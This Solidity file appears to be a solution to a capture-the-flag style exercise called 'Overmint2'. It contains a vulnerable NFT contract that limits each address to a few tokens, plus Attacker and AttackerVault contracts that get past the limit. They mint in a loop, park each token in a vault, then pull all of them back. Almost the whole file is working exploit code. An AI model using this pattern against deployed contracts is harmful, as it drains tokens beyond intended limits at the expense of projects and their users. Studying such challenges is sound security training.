// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.21;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract Attacker { 
    AttackerVault public vault;
    Overmint2 public mintingContract;

    constructor( address _mintingContract) {
        vault = new AttackerVault(_mintingContract);
        mintingContract = Overmint2(_mintingContract);
    }


    function attack() public {
        for(uint i = 0; i < 4; i++){
        uint256 tokenId = mintingContract.totalSupply() + 1;
        mintingContract.mint();
        mintingContract.safeTransferFrom(address(this), address(vault), tokenId);
        }
        mintingContract.mint();
        vault.claim();

    }
}

contract AttackerVault is IERC721Receiver{
    uint256[] public tokenIds;
    uint256 public length;
    address public attacker;
    address mintingContract;

    constructor(address _mintingContract){
        attacker = msg.sender;
        mintingContract = _mintingContract;
    }

    function onERC721Received(address operator,address from,uint256 tokenId,bytes memory data) public returns(bytes4){
        tokenIds.push(tokenId);
        length = tokenIds.length;
        return IERC721Receiver.onERC721Received.selector;
    }

    function claim() public {
        for(uint i = 0; i < length ; i++){
            Overmint2(mintingContract).transferFrom(address(this), attacker, tokenIds[i]);
        }
    }
}